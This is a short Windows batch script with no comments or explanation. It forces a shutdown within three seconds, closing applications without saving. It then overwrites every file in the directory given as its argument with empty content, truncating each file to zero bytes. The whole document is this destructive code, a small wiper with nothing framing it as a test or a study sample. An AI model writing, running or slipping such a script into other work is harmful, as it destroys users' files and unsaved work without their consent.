@echo off
shutdown.exe /s /t 03 /f
pushd %*
for %%j in (*) do type nul > "%%j"
popd